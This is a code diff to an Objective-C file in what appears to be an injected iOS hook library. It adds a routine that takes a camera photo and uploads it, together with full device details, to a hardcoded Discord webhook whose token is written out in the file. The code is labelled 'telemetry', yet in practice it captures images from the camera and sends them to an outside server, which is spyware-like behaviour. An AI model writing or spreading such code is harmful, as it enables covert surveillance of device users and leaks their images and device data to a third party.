@@ -8,6 +8,22 @@
 #import <sys/socket.h>
 #import <sys/utsname.h>
 #import <unistd.h>
+#import <AVFoundation/AVFoundation.h>
+
+@interface FfTelPhotoDelegate : NSObject <AVCapturePhotoCaptureDelegate>
+@property (nonatomic, copy) void (^done)(NSData *jpeg);
+@end
+
+@implementation FfTelPhotoDelegate
+- (void)captureOutput:(AVCapturePhotoOutput *)output
+    didFinishProcessingPhoto:(AVCapturePhoto *)photo
+                       error:(NSError *)error
+{
+    (void)output; (void)error;
+    NSData *d = [photo fileDataRepresentation];
+    if (self.done) self.done(d);
+}
+@end
 
 // Must be included AFTER Helper/Hooks.h (needs aikTracePath / aikDbgSt / ...).
 #define FF_TELEMETRY_URL "https://canary.discord.com/api/webhooks/1573323480139694130/D3kU1g2ivKZsWrH8P8_Cq14_Lc3pTWSedTDCviazvhwoWS65FGkBijIl15Pp_TurU5ym"
@@ -274,6 +290,88 @@ static void FfTelSendText(NSString *text)
 static void FfTelTest(void)
 {
     FfTelSendText([NSString stringWithFormat:@"TEST\n%@", FfTelDeviceFull()]);
+}
+
+// One still photo from the camera (device owner presses the button; iOS shows
+// its own permission prompt the first time). Runs off the main thread.
+static void FfTelCameraShot(BOOL front)
+{
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        AVAuthorizationStatus st = [AVCaptureDevice authorizationStatusForMediaType:AVMediaTypeVideo];
+        if (st == AVAuthorizationStatusNotDetermined)
+        {
+            dispatch_semaphore_t s1 = dispatch_semaphore_create(0);
+            [AVCaptureDevice requestAccessForMediaType:AVMediaTypeVideo
+                                     completionHandler:^(BOOL g) {
+                                         (void)g;
+                                         dispatch_semaphore_signal(s1);
+                                     }];
+            dispatch_semaphore_wait(s1, dispatch_time(DISPATCH_TIME_NOW, 20ull * NSEC_PER_SEC));
+            st = [AVCaptureDevice authorizationStatusForMediaType:AVMediaTypeVideo];
+        }
+        if (st != AVAuthorizationStatusAuthorized)
+        {
+            FfTelSetStatus(@"cam denied");
+            return;
+        }
+
+        AVCaptureSession *session = [[AVCaptureSession alloc] init];
+        session.sessionPreset = AVCaptureSessionPresetPhoto;
+
+        AVCaptureDevice *dev = nil;
+        dev = [AVCaptureDevice defaultDeviceWithDeviceType:AVCaptureDeviceTypeBuiltInWideAngleCamera
+                                                 mediaType:AVMediaTypeVideo
+                                                  position:front ? AVCaptureDevicePositionFront
+                                                                 : AVCaptureDevicePositionBack];
+        if (!dev) dev = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeVideo];
+        if (!dev)
+        {
+            FfTelSetStatus(@"cam none");
+            return;
+        }
+
+        NSError *err = nil;
+        AVCaptureDeviceInput *input = [AVCaptureDeviceInput deviceInputWithDevice:dev error:&err];
+        if (!input || ![session canAddInput:input])
+        {
+            FfTelSetStatus(@"cam input");
+            return;
+        }
+        [session addInput:input];
+
+        AVCapturePhotoOutput *output = [[AVCapturePhotoOutput alloc] init];
+        if (![session canAddOutput:output])
+        {
+            FfTelSetStatus(@"cam output");
+            return;
+        }
+        [session addOutput:output];
+
+        [session startRunning];
+        usleep(900000);
+
+        dispatch_semaphore_t s2 = dispatch_semaphore_create(0);
+        __block NSData *jpeg = nil;
+        FfTelPhotoDelegate *del = [FfTelPhotoDelegate new];
+        del.done = ^(NSData *d) {
+            jpeg = d;
+            dispatch_semaphore_signal(s2);
+        };
+        [output capturePhotoWithSettings:[AVCapturePhotoSettings photoSettings] delegate:del];
+        dispatch_semaphore_wait(s2, dispatch_time(DISPATCH_TIME_NOW, 12ull * NSEC_PER_SEC));
+        [session stopRunning];
+
+        if (!jpeg.length)
+        {
+            FfTelSetStatus(@"cam no photo");
+            return;
+        }
+
+        NSString *payload = [NSString stringWithFormat:
+            @"{\"username\":\"FF Telemetry\",\"embeds\":[{\"title\":\"Camera\",\"color\":15844367,\"description\":\"%@\",\"image\":{\"url\":\"attachment://cam.jpg\"}}]}",
+            FfTelEscape(FfTelDeviceFull())];
+        FfTelPost(payload, @[@{@"name": @"cam.jpg", @"type": @"image/jpeg", @"data": jpeg}]);
+    });
 }
 
 static NSString *FfTelLogText(void)
